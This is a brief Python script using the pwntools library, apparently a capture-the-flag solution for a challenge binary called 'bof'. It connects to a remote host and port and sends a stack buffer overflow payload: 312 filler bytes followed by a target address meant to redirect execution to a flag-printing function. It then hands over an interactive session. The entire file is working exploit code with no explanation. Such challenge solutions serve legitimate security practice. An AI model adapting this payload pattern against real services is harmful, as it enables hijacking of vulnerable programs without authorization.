from pwn import *

bin='./bof'

#p=process(bin)
p=connect('34.159.14.234',30296)
offset=312
flag=0x400768
payload=b'A'*offset+p64(flag)
p.sendafter(b'Please enter the flag: ',payload)
p.interactive()
